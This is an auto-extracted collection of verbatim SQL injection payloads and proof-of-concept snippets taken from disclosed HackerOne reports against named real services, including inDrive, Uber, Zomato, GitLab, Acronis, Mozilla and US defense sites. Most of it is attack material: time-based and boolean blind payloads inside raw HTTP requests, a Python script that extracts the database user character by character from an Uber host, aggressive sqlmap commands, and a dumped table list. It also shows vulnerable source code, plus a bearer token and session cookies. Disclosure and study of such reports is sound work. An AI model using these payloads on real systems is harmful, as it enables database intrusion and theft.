# SQL injection — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #2051931 Blind SQL injection on id.indrive.com — indrive — $4,134 — Blind SQL Injection
Source: `hackerone/reports/2023/2051931.md` (https://hackerone.com/reports/2051931)

```
/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--
```

```
/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--
```

```
curl -i -s -k -X $'GET' \
    -H $'Host: id.indrive.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Origin: https://promo.indrive.com' -H $'Referer: https://promo.indrive.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' -H $'Connection: close' \
    $'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'
```

## #150156 SQL Injection on sctrack.email.uber.com.cn — uber — $4,000 — SQL Injection
Source: `hackerone/reports/2016/150156.md` (https://hackerone.com/reports/150156)

```
http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ==
```

```
import json
import string
import requests
from urllib import quote
from base64 import b64encode

base = string.digits + '_-@.'
payload = {"user_id": 5755, "receiver": "blog.orange.tw"}

for l in range(0, 30):
    for i in 'i'+base:
        payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#"%(l+1, i)
        new_payload = json.dumps(payload)
        new_payload = b64encode(new_payload)
        r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))

        if len(r.content)>0:
            print i,
            break
```

```
    for i in 'i'+base:
        payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#"%(l+1, i)
        new_payload = json.dumps(payload)
        new_payload = b64encode(new_payload)
        r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))
```

## #1044716 SQL Injection in www.hyperpure.com — eternal — $2,000 — Code Injection
Source: `hackerone/reports/2021/1044716.md` (https://hackerone.com/reports/1044716)

```
PUT /consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc    HTTP/1.1
Host: api.hyperpure.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
X-Client: consumer
X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a
HeaderRoute: v2
APIVersion: 4.2
AppType: web
Content-Length: 246
Origin: https://www.hyperpure.com
Connection: close
Referer: https://www.hyperpure.com/register

{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"█████","salesLeadId":"31cf8eb0-f81e-4c99-acad-35eae89ed659"}
```

## #838855 [www.zomato.com] Blind SQL Injection in /php/geto2banner — eternal — $2,000 — SQL Injection
Source: `hackerone/reports/2020/838855.md` (https://hackerone.com/reports/838855)

```
POST /php/geto2banner HTTP/1.1
Host: www.zomato.com
Connection: close
Content-Length: 73
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en

res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
```

## #298176 SQL injection in MilestoneFinder order method — gitlab — $2,000 — SQL Injection
Source: `hackerone/reports/2018/298176.md` (https://hackerone.com/reports/298176)

```
def milestones
    search_params = params.merge(group_ids: group.id)

    milestones = MilestonesFinder.new(search_params).execute
    # ...
```

```
  def execute
    return Milestone.none if project_ids.empty? && group_ids.empty?

    items = Milestone.all
    items = by_groups_and_projects(items)
    items = by_title(items)
    items = by_state(items)

    order(items)
  end
```

```
 def order(items)
    if params.has_key?(:order)
      items.reorder(params[:order])
    else
      order_statement = Gitlab::Database.nulls_last_order('due_date', 'ASC')
      items.reorder(order_statement)
    end
  end
```

## #1650264 GitHub Security Lab (GHSL) Vulnerability Report: SQLInjection in FileContentProvider.kt (GHSL-2022-059) — owncloud — $300 — SQL Injection
Source: `hackerone/reports/2023/1650264.md` (https://hackerone.com/reports/1650264)

```
<provider
    android:name=".providers.FileContentProvider"
    android:authorities="@string/authority"
    android:enabled="true"
    android:exported="true"
    android:label="@string/sync_string_files"
    android:syncable="true" />
```

```
override fun delete(uri: Uri, where: String?, whereArgs: Array<String>?): Int {
```

```
private fun delete(db: SQLiteDatabase, uri: Uri, where: String?, whereArgs: Array<String>?): Int {
    // --snip--
    when (uriMatcher.match(uri)) {
        SINGLE_FILE -> {
            // --snip--
            count = db.delete(
                ProviderTableMeta.FILE_TABLE_NAME,
                ProviderTableMeta._ID +
                        "=" +
                        uri.pathSegments[1] +
                        if (!TextUtils.isEmpty(where))
                            " AND ($where)" // injection
                        else
                            "", whereArgs
            )
        }
        DIRECTORY -> {
            // --snip--
            count += db.delete(
                ProviderTableMeta.FILE_TABLE_NAME,
                ProviderTableMeta._ID + "=" +
                        uri.pathSegments[1] +
                        if (!TextUtils.isEmpty(where))
                            " AND ($where)" // injection
                        else
                            "", whereArgs
            )
        }
        ROOT_DIRECTORY ->
            count = db.delete(ProviderTableMeta.FILE_TABLE_NAME, where, whereArgs) // injection
        SHARES -> count =
            OwncloudDatabase.getDatabase(MainApp.appContext).shareDao().deleteShare(uri.pathSegments[1])
        CAPABILITIES -> count = db.delete(ProviderTableMeta.CAPABILITIES_TABLE_NAME, where, whereArgs) // injection
        UPLOADS -> count = db.delete(ProviderTableMeta.UPLOADS_TABLE_NAME, where, whereArgs) // in
```

## #923020 SQL injection on admin.acronis.host development web service — acronis — $250 — SQL Injection
Source: `hackerone/reports/2021/923020.md` (https://hackerone.com/reports/923020)

```
GET /api/admin/pages?page=1&limit=100&sort=%2Btype&filter=%7B%7D&search=* HTTP/1.1
Host: dev.acronis.host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZXYuYWNyb25pcy5ob3N0XC9hcGlcL2F1dGhcL2xvZ2luIiwiaWF0IjoxNTk0Njk1MzgzLCJleHAiOjE1OTQ3MzEzODMsIm5iZiI6MTU5NDY5NTM4MywianRpIjoiSnBkczlKY0x6VHF5QXphOCIsInN1YiI6MSwicHJ2IjoiODdlMGFmMWVmOWZkMTU4MTJmZGVjOTcxNTNhMTRlMGIwNDc1NDZhYSJ9._K-nn1elXhqx1RNszBeZFwX1dbyCVtv63m_-DGp7UmE
Origin: https://admin.acronis.host
Connection: close
Referer: https://admin.acronis.host/dev.acronis.host/en-US/products/4372
```

```
sudo python sqlmap.py -r {PATH TO FILE} --level 5 --risk 3 --random-agent --dbs
```

```
Database: acronis_site
[24 tables]
+----------------------+
| awards               |
| failed_jobs          |
| files                |
| history_pages        |
| locales              |
| migrations           |
| page_products        |
| page_translations    |
| pages                |
| pages_1              |
| pages_2              |
| pages_3              |
| password_resets      |
| product_prices       |
| product_translations |
| products             |
| products_1           |
| related_products     |
| related_tags         |
| resources            |
| tags                 |
| users                |
| variables            |
| webinars             |
+----------------------+
```

## #291764 SQL Injection found in NextCloud Android App Content Provider — nextcloud — $150 — SQL Injection
Source: `hackerone/reports/2019/291764.md` (https://hackerone.com/reports/291764)

```
        (unrecognized token: "' FROM filelist ORDER BY filename collate nocase asc" (code 1): , while compiling: SELECT ' FROM filelist ORDER BY filename collate nocase asc)
```

```
        (unrecognized token: "' FROM filelist ORDER BY filename collate nocase asc" (code 1): , while compiling: SELECT ' FROM filelist ORDER BY filename collate nocase asc
```

## #518669 SQLi allow query restriction bypass on exposed FileContentProvider — nextcloud — $100 — SQL Injection
Source: `hackerone/reports/2019/518669.md` (https://hackerone.com/reports/518669)

```
 @l444
        switch (mUriMatcher.match(uri)) {
            case ROOT_DIRECTORY:
            case SINGLE_FILE:
            case DIRECTORY:
                break;

            default:
                if (isCallerNotAllowed(uri)) {
                    return null;
                }
}
```

```
 if (mUriMatcher.match(uri) == ROOT_DIRECTORY && projectionArray != null) {
```

```
 content query --uri content://org.nextcloud/file --projection "* from ocshares --"                                              
```

## #844428 [www.zomato.com] Abusing LocalParams (city) to Inject SOLR query — eternal — $100 — SQL Injection
Source: `hackerone/reports/2020/844428.md` (https://hackerone.com/reports/844428)

```
GET /webapi/searchapi.php?city=51\ HTTP/1.1
Host: www.zomato.com
Connection: close
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/80.0.3987.149 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en
```

```
HTTP/1.1 500 Internal Server Error
```

```
GET /webapi/searchapi.php?city=51\\ HTTP/1.1
Host: www.zomato.com
Connection: close
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/80.0.3987.149 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en
```

## #297478 SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent  — gsa_bbp — - — SQL Injection
Source: `hackerone/reports/2019/297478.md` (https://hackerone.com/reports/297478)

```
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*
```

```
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*
```

```
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*
```

## #761304  SQL Injection on cookie parameter — mtn_group — - — SQL Injection
Source: `hackerone/reports/2020/761304.md` (https://hackerone.com/reports/761304)

```
GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
Host: mtn.com.ye
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1
Upgrade-Insecure-Requests: 1
```

```
GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
Host: mtn.com.ye
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1
Upgrade-Insecure-Requests: 1
'''

I would like to ask for permission for further exploiting this issue.
```

## #435066 SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter — security — - — SQL Injection
Source: `hackerone/reports/2018/435066.md` (https://hackerone.com/reports/435066)

```
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

```
curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

```
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(5\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 0% cpu 5.726 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(1\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 2% cpu 1.631 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(10\)%3B--%27
{}curl -X POST   0.02s user 0.01s system 0% cpu 10.557 total
```

## #1039315 Sql injection on docs.atavist.com — automattic — - — SQL Injection
Source: `hackerone/reports/2020/1039315.md` (https://hackerone.com/reports/1039315)

```
Parameter: search (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: limit=10&offset=20&organization_id=88822&search=0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg&sort=
```

```
[20:54:30] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.2.34
back-end DBMS: MySQL >= 5.0.12
```

```
GET /reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0&sort= HTTP/1.1
Host: docs.atavist.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _fbp=fb.1.1605829485735.1219501220; __stripe_mid=f950034a-6de5-408c-b227-5ef48058f129d296dd; rgisanonymous=true; rguserid=5625868d-bfff-49dc-90ac-0269e5138dc8; rguuid=true
Upgrade-Insecure-Requests: 1
```

## #1224660 bypass sql injection #1109311 — acronis — - — SQL Injection
Source: `hackerone/reports/2021/1224660.md` (https://hackerone.com/reports/1224660)

```
POST /wp-login.php HTTP/2
Host: www.acronis.cz
Cookie: PHPSESSID=49kn3h0ecv1urjd70jucn2j4gh; _fbp=fb.1.1623467463578.959472854; wordpress_test_cookie=WP+Cookie+check
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.acronis.cz/wp-login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 717
Origin: https://www.acronis.cz
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

log=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pwd=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2815%29%2C0%29%29XOR%27Z+%3D%3E&g-recaptcha-response=03AGdBq25b-W6tugq-xMA5r4HA1FJJX1uDMve_1fZXKK0wtp2SxW745D7MwrwsXYpIQtRFHR4cMPxIWp5nTWRR89A4LGaom7kVvG7eMiPGe2z-rQIAM9oAd2Anp5_RBkg9tTndCyHlFh1cMUZKTtq-eF1yEI_Ixi7c6-xkDrqvs0Kb5DEZ_eu9SWNnm_evtbW0XXtz8pI7ipHNzw5icYUn6LmxkbxmyqfyQ5j4ZaPGnoPvtS2huSZKyN9RoVBL-v9UHs8Zdkj1dcVvVwurhVCNjBBFPTnZeA-D1iYSp_kqtfLzW1d84F_-9p09Tw9bp7qlirNa-UFSKnWxY27c6oAw5_p649TgBzLQMY4-bMK0_2bbqOv1RIy2vhqIXjpeh6r8l4-MAHHgllF0iW2ClpXKn5Y95DSg2muoc-zzdQ5xE2cpLL3Gw71nNITafbIC2QEKyyS-QBk8h1dn&wp-submit=P%C5%99ihl%C3%A1sit+se&redirect_to=https%3A%2F%2Fwww.acronis.cz%2Fwp-admin%2F&testcookie=1
```

```
    0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 20.002
    0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.282
    0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.912
    0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 16.553
    0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.463
    0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 1.229
    0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.79
```

## #2958619 SQLi | in URL paths — mtn_group — - — SQL Injection
Source: `hackerone/reports/2025/2958619.md` (https://hackerone.com/reports/2958619)

```
sqlmap -u "██████
```

## #1044698 [intensedebate.com] SQL Injection Time Based On /js/commentAction/ — automattic — - — SQL Injection
Source: `hackerone/reports/2021/1044698.md` (https://hackerone.com/reports/1044698)

```
Host: www.intensedebate.com
```

```
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(15)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
```

```
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(7)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
```

## #2633959 SQL injection in URL path leads to Database Access — mtn_group — - — SQL Injection
Source: `hackerone/reports/2025/2633959.md` (https://hackerone.com/reports/2633959)

```
https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562'/contactPersonId/0  
```

## #1069561 SQL Injection  intensedebate.com — automattic — - — SQL Injection
Source: `hackerone/reports/2021/1069561.md` (https://hackerone.com/reports/1069561)

```
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: acctid=1 AND 1726=1726
```

```
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: acctid=1 AND (SELECT 8327 FROM (SELECT(SLEEP(5)))yrDl)
```

## #3198980 Woocommerce SQL Injection in WC_Report_Coupon_Usage — automattic — - — SQL Injection
Source: `hackerone/reports/2025/3198980.md` (https://hackerone.com/reports/3198980)

```
GET /wp-admin/admin.php?page=wc-reports&tab=orders&report=coupon_usage&coupon_codes=')+union+select+1,sleep(10)--+- HTTP/1.1
Host: <host>
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie:<cookie of logged in session>
Connection: close
```

```
class-wc-admin-report.php:369, WC_Admin_Report->get_order_report_data()
class-wc-report-coupon-usage.php:449, WC_Report_Coupon_Usage->get_main_chart()
html-report-by-date.php:91, include()
class-wc-report-coupon-usage.php:153, WC_Report_Coupon_Usage->output_report()
class-wc-admin-reports.php:256, WC_Admin_Reports::get_report()
html-admin-page-reports.php:81, include_once()
class-wc-admin-reports.php:80, WC_Admin_Reports::output()
class-wc-admin-menus.php:348, WC_Admin_Menus->reports_page()
class-wp-hook.php:324, WP_Hook->apply_filters()
class-wp-hook.php:348, WP_Hook->do_action()
plugin.php:517, do_action()
admin.php:260, {main}()
```

```
	public function __construct() {
		if ( isset( $_GET['coupon_codes'] ) && is_array( $_GET['coupon_codes'] ) ) {
			$this->coupon_codes = array_filter( array_map( 'sanitize_text_field', wp_unslash( $_GET['coupon_codes'] ) ) );
		} elseif ( isset( $_GET['coupon_codes'] ) ) {
			$this->coupon_codes = array_filter( array( sanitize_text_field( wp_unslash( $_GET['coupon_codes'] ) ) ) );
		}
	}
```

## #3292573 SQL Injection when using FilteredRelation — django — - — SQL Injection
Source: `hackerone/reports/2025/3292573.md` (https://hackerone.com/reports/3292573)

```
    def test_select_related_foreign_key_sqli(self):
        user_data = "author_join2\""

        qs = (
            Book.objects.annotate(**{
                user_data: FilteredRelation("author"),
        })
            .select_related(user_data)
        )

        qs._fetch_all()
```

```
    def test_select_related_foreign_key_sqli(self):
        user_data = "author_join2\""
```

```
        qs = (
            Book.objects.annotate(**{
                user_data: FilteredRelation("author"),
        })
            .select_related(user_data)
        )
```

## #2312334 Time based SQL injection at████████ — deptofdefense — - — SQL Injection
Source: `hackerone/reports/2024/2312334.md` (https://hackerone.com/reports/2312334)

```
POST /pubs/index.php HTTP/1.1
Host:██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://███████
Referer: https://███████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
```

```
POST /pubs/index.php HTTP/1.1
Host:█████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://████████
Referer: https://████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```

## #3395221 Error-Based & Time-Based SQL Injection in 'keyword' Parameter of admin-search.php Allowing Full Database Access in Revive Adserver v6.0.0 — revive_adserver — - — SQL Injection
Source: `hackerone/reports/2025/3395221.md` (https://hackerone.com/reports/3395221)

```
phpAds_registerGlobalUnslashed('keyword', 'client', 'campaign', 'banner', 'zone', 'affiliate', 'compact');
```

```
$rsClients = $dalClients->getClientByKeyword($keyword, $agencyId);
$rsCampaigns = $dalCampaigns->getCampaignAndClientByKeyword($keyword, $agencyId);
$rsBanners = $dalBanners->getBannerByKeyword($keyword, $agencyId);
$rsAffiliates = $dalAffiliates->getAffiliateByKeyword($keyword, $agencyId);
$rsZones = $dalZones->getZoneByKeyword($keyword, $agencyId);
```

```
Payload: keyword=FUZZ') AND EXTRACTVALUE(8429,CONCAT(0x5c,0x716a7a6a71,(SELECT (ELT(8429=8429,1))),0x7178787871))-- Nqvq&compact=t
```

## #2209130 SQL Injection on prod.oidc-proxy.prod.webservices.mozgcp.net via invite_code parameter - Mozilla social inscription — mozilla — - — SQL Injection
Source: `hackerone/reports/2024/2209130.md` (https://hackerone.com/reports/2209130)

```
POST /interaction/KTTbkN8LaJgYIb7fIwPYX/signup HTTP/2
Host: prod.oidc-proxy.prod.webservices.mozgcp.net
Cookie: <session_cookies>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.9999.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 119
Origin: null
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Ch-Ua-Platform: "macOS"
Sec-Ch-Ua: "Google Chrome";v="103", "Chromium";v="103", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Te: trailers

handle=xxx&display_name=xxx&invite_code=xxx-&age=25&terms=on&rules=on
```

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--
```

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(10))--
```

## #2737595 SQL Injection — deptofdefense — - — SQL Injection
Source: `hackerone/reports/2024/2737595.md` (https://hackerone.com/reports/2737595)

```
sqlmap -u "███████" \
--technique=BT --level=5 --risk=3 --threads=10 -p 'filter[event]' \
--dbms='MySQL' --batch --current-db --random-agent
```

## #687908 Found Origin IP's Lead To Access To [ Grafana Instance , PgHero Instance [ Can SQL Injection ]   — omise — - — Improper Access Control - Generic
Source: `hackerone/reports/2019/687908.md` (https://hackerone.com/reports/687908)

```
    -H $'Host: pghero.dev-go.exchange' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' -H $'Sec-Fetch-Site: same-origin' -H $'Referer: https://35.244.200.254/explain' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.' \
    $'https://35.244.200.254/'`
```

## #995122 [SQLI ]Time  Bassed Injection at ██████████ via referer header — deptofdefense — - — SQL Injection
Source: `hackerone/reports/2020/995122.md` (https://hackerone.com/reports/995122)

```
Host: ███████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
████=*
Upgrade-Insecure-Requests: 1
Referer: http://www.google.com/search?hl=en&q='+(select*from(select(sleep(7*7)))a)+' 
```

## #2597543 Blind Sql Injection in https://████ — deptofdefense — - — SQL Injection
Source: `hackerone/reports/2024/2597543.md` (https://hackerone.com/reports/2597543)

```
   sqlmap --url "https://█████████/" --batch --random-agent --level 5 --risk 3
   
```

```
   Parameter: User-Agent (User-Agent)
       Type: boolean-based blind
       Title: OR boolean-based blind - WHERE or HAVING clause
       Payload: -5127 OR 2687=2687
   
```

```
